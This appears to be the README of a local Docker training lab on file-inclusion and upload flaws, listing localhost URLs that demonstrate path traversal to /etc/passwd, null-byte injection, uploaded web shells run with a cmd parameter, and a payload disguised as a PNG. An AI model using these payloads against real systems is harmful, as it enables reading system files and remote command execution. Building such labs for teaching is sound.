Start docker: ./start.sh

Stop docker: ./end.sh

Examples for arbitrary upload in directory <strong>files</strong>


http://127.0.0.1:8080/read.php?file=hello.txt


http://127.0.0.1:8080/read.php?file=secret.txt


http://127.0.0.1:8080/child_directory/secret.txt


http://127.0.0.1:8080/read.php?file2=../../../../../../etc/passwd


http://127.0.0.1:8080/nullbyte.php?page=../../../../../../etc/passwd%00


http://127.0.0.1:8080/uploads/


http://127.0.0.1:8080/uploads/web_shell.php?cmd=id


http://127.0.0.1:8080/uploads/


http://127.0.0.1:8080/uploads/popular_file.php


http://127.0.0.1:8080/img/


http://127.0.0.1:8080/img/uploads/shell.pht?cmd=id


http://127.0.0.1:8080/img/


http://127.0.0.1:8080/img/uploads/image.png - success


http://127.0.0.1:8080/img/


http://127.0.0.1:8080/img/uploads/payload.png 


http://127.0.0.1:8080/nullbyte.php?page=img/uploads/payload.png%00






